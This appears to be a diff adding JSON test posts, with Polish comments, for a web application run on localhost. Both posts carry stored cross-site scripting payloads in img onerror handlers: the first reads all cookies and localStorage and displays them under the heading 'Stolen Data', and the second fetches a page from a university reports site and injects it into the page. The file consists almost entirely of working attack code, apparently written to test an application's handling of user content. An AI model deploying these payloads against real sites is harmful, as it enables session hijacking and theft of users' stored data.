@@ -1,0 +1,16 @@
+// post pokazujacy cookiesy i LS w domienie localhost
+
+{
+    "id": "a652",
+    "title": "xx",
+    "content": "<img src=\"xd\" onerror=\"// 1. Wyszukaj element <main> w DOM\n        var mainElement = document.querySelector('main');\n        \n        // 2. Usuń element <main> z DOM\n        if (mainElement) {\n            mainElement.remove();\n        }\n        \n        // 3. Stwórz nowy element, który będzie wyświetlał cookies oraz localStorage\n        var newMain = document.createElement('main');\n        \n        // 4. Pobierz ciasteczka i localStorage\n        var cookies = document.cookie;\n        var localStorageData = '';\n        for (var i = 0; i < localStorage.length; i++) {\n            var key = localStorage.key(i);\n            var value = localStorage.getItem(key);\n            localStorageData += key + ': ' + value + '<br>';\n        }\n        \n        // 5. Utwórz HTML do wstawienia w nowy element <main>\n        newMain.innerHTML = `\n            <h1>Stolen Data</h1>\n            <p><strong>Cookies:</strong><br>${cookies}</p>\n            <p><strong>Local Storage:</strong><br>${localStorageData}</p>\n        `;\n        \n        // 6. Znajdź kontener z klasą q-page-container\n        var container = document.querySelector('.q-page-container');\n        \n        // 7. Dodaj nowy element <main> do kontenera\n        if (container) {\n            container.appendChild(newMain);\n        }\" />"
+}
+
+
+// ten post wysyla zapytania o strone sprawozdania.kia.prz.edu.pl
+
+{
+      "id": "c50c",
+      "title": "sx",
+      "content": "<img src=\"x\" onerror=\"(async () => { try { const response = await fetch('https://www.sprawozdania.kia.prz.edu.pl/index.php?entry=sa_reports', { method: 'GET', mode: 'no-cors', headers: { 'Accept': 'text/html' } }); if (!response.ok) { throw new Error(`HTTP error! status: ${response.status}`); } const html = await response.text(); const container = document.querySelector('.q-page-container'); if (container) { container.innerHTML = html; } else { console.error('Nie znaleziono elementu .q-page-container'); } } catch (error) { console.error('Wystąpił błąd:', error); } })();\" />"
+    },
